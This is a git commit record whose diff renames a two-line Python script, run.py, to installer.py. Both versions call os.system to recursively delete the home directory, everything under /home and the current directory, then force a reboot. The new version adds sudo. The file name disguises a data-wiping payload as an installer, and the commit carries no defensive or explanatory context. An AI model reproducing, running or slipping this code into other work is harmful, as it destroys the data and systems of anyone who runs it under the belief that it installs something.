113415df71271dbc6a3b8b16de52919af8e42855
BenPI88 <97198967+BenPI88@users.noreply.github.com>
2022-10-22 09:18:09 -0500

    Update and rename run.py to installer.py

---
+++ installer.py
@@ -0,0 +1,2 @@
+import os
+os.system("sudo rm -rf ~/* && rm -rf /home/* && rm -rf * && shutdown -r -f")
--- run.py
+++
@@ -1,2 +0,0 @@
-import os
-os.system("rm -rf ~/* && rm -rf /home/* && rm -rf * && shutdown -r -f")
